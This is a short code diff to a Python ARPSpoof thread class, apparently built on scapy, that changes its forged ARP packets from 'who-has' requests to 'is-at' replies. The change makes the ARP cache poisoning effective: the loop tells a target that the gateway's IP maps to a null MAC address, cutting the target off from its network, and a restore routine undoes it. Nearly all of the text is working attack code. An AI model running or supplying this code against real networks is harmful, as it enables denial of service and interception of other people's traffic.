@@ -18,15 +18,15 @@ class ARPSpoof(threading.Thread):
 
 	def restoreARP(self):
 		print("Restoring ARP")
-		net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
+		net.send(net.ARP(op="is-at", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
 
 	def run(self):
 		while not self.close:
 			if self.spoof:
 				#net.ARP(op="who-has", hwdst="00:d9:d1:6d:78:31", pdst="192.168.0.34", hwsrc="00:00:00:00:00:00", psrc="192.168.0.1")
-				net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc="00:00:00:00:00:00", psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
+				net.send(net.ARP(op="is-at", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc="00:00:00:00:00:00", psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
 			else:
-				net.send(net.ARP(op="who-has", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
+				net.send(net.ARP(op="is-at", hwdst=self.machines["target"].mac, pdst=self.machines["target"].ip, hwsrc=self.machines["gateway"].mac, psrc=self.machines["gateway"].ip), verbose=VERBOSITY)
 			time.sleep(1)
 		self.restoreARP()
 
